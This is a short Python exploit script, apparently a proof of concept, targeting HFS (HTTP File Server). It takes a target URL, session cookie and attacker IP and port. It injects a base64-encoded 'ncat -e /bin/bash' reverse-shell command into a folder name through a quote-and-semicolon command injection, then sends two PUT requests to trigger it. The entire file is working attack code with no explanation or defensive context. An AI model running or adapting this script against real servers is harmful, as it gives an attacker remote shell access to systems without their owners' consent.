import requests as req
import base64
import time

url = input("Url (Example http://hfs.victim/{{folder}}/: ")
cookie = input("Cookie: ")
ip = input("Ip: ")
port = input("Port: ")

headers = {"x-hfs-anti-csrf":"1","Cookie":cookie}
command = "ncat {0} {1} -e /bin/bash".format(ip,port)
command = command.encode('utf-8')
payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
print("Send request 1")
send_1 = req.put(url+payload+"/poc.txt",headers=headers, data="poc")
print("Delay for 3 seconds.")
time.sleep(3)
print("Send request 2")
print("Execute payload")
send_2 = req.put(url+payload+"/poc.txt",headers=headers, data="poc")

